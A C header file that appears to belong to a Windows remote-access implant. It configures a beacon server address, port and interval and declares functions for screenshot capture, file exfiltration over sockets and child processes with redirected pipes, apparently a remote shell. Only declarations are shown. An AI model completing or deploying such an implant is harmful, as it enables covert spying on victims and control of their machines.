#pragma once
#include "framework.h"
#include "pch.h"

#include "headers.h"
#include "utils_headers.h"

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <direct.h>

//#define SERVER_HOSTNAME "192.168.48.128"
#define SERVER_HOSTNAME "127.0.0.1"
#define SERVER_PORT 17888
#define INTERVAL_SECONDS 21
#define CONNECTION_TIMEOUT 30

#define MAX_NAME_LEN 1024
#define BUFSIZE (1 << 12)

int startup_wsa(winsock_functions_t* ws_funcs);
void cleanup_wsa(winsock_functions_t* ws_funcs);
SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs);

char* create_temp_filename(const char* basename, kernel32_functions_t* kernel_funcs);
int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs);
int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel32_funcs, user32_functions_t* user32_funcs, gdi32_functions_t* gdi32_funcs);

int send_data(SOCKET socket, const char* buf, SIZE_T size, winsock_functions_t* ws2, kernel32_functions_t* kernel32);
int recv_data(SOCKET socket, char* buf, int len, winsock_functions_t* ws2, kernel32_functions_t* kernel32);
int send_file(SOCKET socket, const char* filepath, winsock_functions_t* ws, kernel32_functions_t* kernel32);



BOOL CreatePipeWithSecurity(HANDLE* hReadPipe, HANDLE* hWritePipe);

DWORD ReadFromPipe(HANDLE hPipe, char* buffer, DWORD bufferSize);

BOOL WriteToPipe(HANDLE hPipe, const char* data);


BOOL CreateChildProcessWithRedirect(
	LPSTR szCmdline,
	HANDLE hStdIn,   // 子进程的标准输入
	HANDLE hStdOut,  // 子进程的标准输出
	HANDLE hStdErr   // 子进程的标准错误
);
